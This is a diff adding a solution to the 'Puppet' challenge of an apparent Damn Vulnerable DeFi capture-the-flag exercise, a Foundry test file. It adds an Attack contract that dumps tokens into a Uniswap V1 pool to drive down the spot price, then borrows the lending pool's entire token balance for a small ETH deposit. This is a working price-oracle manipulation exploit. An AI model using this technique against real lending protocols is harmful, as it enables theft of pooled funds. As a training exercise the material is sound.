@@ -87,7 +87,15 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {}
+    function test_puppet() public checkSolvedByPlayer {
+        Attack attack = new Attack{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
+
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        console.log("player ETH balance", player.balance);
+        attack.attack();
+        console.log("player ETH balance", player.balance /1e18);
+
+    }
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve) private pure returns (uint256) {
@@ -105,4 +113,36 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Attack {
+    DamnValuableToken immutable token;
+    PuppetPool immutable lendingPool;
+    IUniswapV1Exchange immutable uniswapV1Exchange;
+    address immutable recovery;
+
+    constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
+        token = _token;
+        lendingPool = _pool;
+        uniswapV1Exchange = _exchange;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        uint256 initialTokenBalance = token.balanceOf(address(this));
+        uint256 POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+        token.approve(address(uniswapV1Exchange), initialTokenBalance);
+        uniswapV1Exchange.tokenToEthTransferInput(initialTokenBalance, 9e18, block.timestamp, address(this));
+        
+        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        require(address(this).balance >= depositRequired, "Attack contract doesn't have enough ETH for deposit");
+        
+        lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, address(recovery));
+        uint256 attackETHBalance = address(this).balance;
+        (bool s,) = msg.sender.call{value: attackETHBalance}("");
+        require(s, "Transfer failed");
+    }
+
+    receive() external payable {}
 }
